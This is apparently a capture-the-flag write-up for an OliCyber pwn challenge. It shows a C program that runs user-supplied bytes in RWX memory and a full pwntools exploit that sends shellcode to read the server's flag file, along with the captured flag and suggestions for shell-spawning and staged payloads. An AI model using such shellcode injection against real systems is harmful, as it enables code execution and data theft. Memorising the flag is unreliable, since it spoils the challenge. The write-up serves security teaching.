# URL
https://training.olicyber.it/challenges#challenge-290

# Concept
This challenge tests the ability to use `pwntools` shellcode generation facilities. The key concepts are:

1. **shellcraft**: A pwntools module that generates assembly code for various purposes. `shellcraft.amd64.linux.cat('flag')` generates assembly to open the file `flag`, read its contents, and write them to stdout.

2. **asm()**: Assembles the generated assembly code into machine code bytes: `asm(assembly_code, arch='amd64')`.

3. **mmap RWX execution**: The binary allocates a memory region with `PROT_READ|PROT_WRITE|PROT_EXEC`, reads user-supplied bytes into it, and jumps to it — a classic shellcode runner.

### The Binary (sw-20.c)

```c
shellcode = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
                 MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
printf("Shellcode size (max 4096): ");
scanf("%ld", &size);
printf("Send me exactly %ld bytes: ", size);
read(0, shellcode, size);
asm volatile("jmp *%0" : : "r" (shellcode));
```

The program:
1. Prints a welcome message and waits for a keypress
2. Allocates 0x1000 bytes of RWX memory
3. Asks for shellcode size (capped at 4096)
4. Reads exactly that many bytes
5. Jumps to the shellcode

The flag is in a file named `flag` in the working directory.

# Method of Solve

### Step 1: Craft the Shellcode

Using `shellcraft.amd64.linux.cat('flag')` generates assembly that:
- Opens the file `flag` using the `open` syscall
- Reads its contents with `read` into a buffer
- Writes the buffer to stdout with `write`
- Exits cleanly

Assemble with `asm()` to get raw bytes.

### Step 2: Write the Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

p = remote('software-20.challs.olicyber.it', 13003)

# Generate shellcode that cats the flag file
shellcode = asm(shellcraft.amd64.linux.cat('flag'))

# Start the challenge
p.recvuntil(b'...')
p.sendline()

# Send the size
p.recvuntil(b': ')
p.sendline(str(len(shellcode)).encode())

# Send the shellcode
p.recvuntil(b': ')
p.send(shellcode)

# Receive output (includes "[*] Executing shellcode..." + flag)
print(p.recvall(timeout=5).decode())
```

### Step 3: Run

```bash
$ python3 exploit.py
[*] Executing shellcode...
flag{c5745d7eea17b5ab}
```

## Alternative Approaches

- **Interactive shell**: Use `shellcraft.amd64.linux.sh()` to get a `/bin/sh` shell, then manually `cat flag`.
- **Custom shellcode**: Write raw syscall assembly manually for finer control.
- **connect/stager**: Use staged shellcode delivery for larger payloads.

## Key Takeaways

- `shellcraft.amd64.linux.<action>()` generates assembly for common tasks
- `asm()` compiles assembly to machine code
- `context.arch = 'amd64'` sets the target architecture globally
- pwntools handles calling convention and syscall number details automatically

# Flag

```
flag{c5745d7eea17b5ab}
```
- So the final flag is **flag{c5745d7eea17b5ab}**
